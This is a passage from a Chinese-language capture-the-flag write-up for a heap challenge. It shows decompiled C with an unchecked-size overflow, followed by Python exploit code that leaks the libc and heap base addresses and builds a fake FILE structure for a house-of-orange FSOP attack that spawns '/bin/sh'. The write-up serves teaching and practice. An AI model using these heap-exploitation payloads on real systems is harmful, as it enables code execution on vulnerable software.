punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>没有 <code>free</code> ，本能的想到 house-of-orange 的利用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  _DWORD nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 没规定 add 之后 size，可以溢出</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0x1000u</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"too large\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>chunk_ptr <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>chunk_ptr <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 只能读 8 字节，还是比较的刁钻的</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>进行 house-of-orange 需要 libcbase 和 heapbase，libcbase 好泄露，但是 heapbase 的泄露方法比较的麻烦，需要调整堆风水，将三次 unsortedbin 内的 top_chunk 都放到同一大小的 largebin 链表项内</p>\n<p>泄露 libcbase</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x408</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xbf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x61</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span> <span class=\"token operator\">+</span> <span class=\"token number\">16672</span></pre></td></tr></table></figure><p>将 old_top_chunk 放进 <code>0x480-0x4b0</code> largebin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4b1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X600</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715121105947.png\" alt=\"image-20240715121105947\"></p>\n<p>然后用前面的思想再放两个这个 largebin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4d1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xaf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x5b0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xae1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>调整堆风水泄露 heapbase</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4a0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>heapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1ba61</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715121450635.png\" alt=\"image-20240715121450635\"></p>\n<p>泄露完之后，就进行 FSOP 攻击。需要配合 unsortedbin attach</p>\n<p>所以需要再次把 <code>top_chunk</code>  放置到 unsortedbin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x181</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715121817321.png\" alt=\"image-20240715121817321\"></p>\n<p><img data-src=\"/img/houes-of-orange/image-20240715121859179.png\" alt=\"image-20240715121859179\"></p>\n<p>在索引第 19 个距离处于 unsortedbin 的 chunk 块较近，从这里写起，实现由 unsorted attach 的发起的 FSOP 攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># fake file</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token comment\"># flag overflow arg -> system('/bin/sh')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># _IO_read_ptr small bin size</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#  unsoted bin attack</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_read_end)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>io_list_all <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _IO_read_base</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#bypass check</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 使 fp->_IO_write_base &lt; fp->_IO_write_ptr 绕过检查</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_base </span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_ptr</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_end</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_base</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_end</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_base</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_backup_base</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_end</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_markers</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_chain</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _fileno</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _flags2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _old_offset</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>f <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ushort _cur_colum;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _vtable_offset</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _shrotbuf[1]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># null for alignment</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _offset</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _codecvt</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _wide_data</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_list</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_buf</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># __pad5</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _mode 为了绕过检查，fp->mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _unused2</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p <span class=\"token operator\">+=</span> f</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p <span 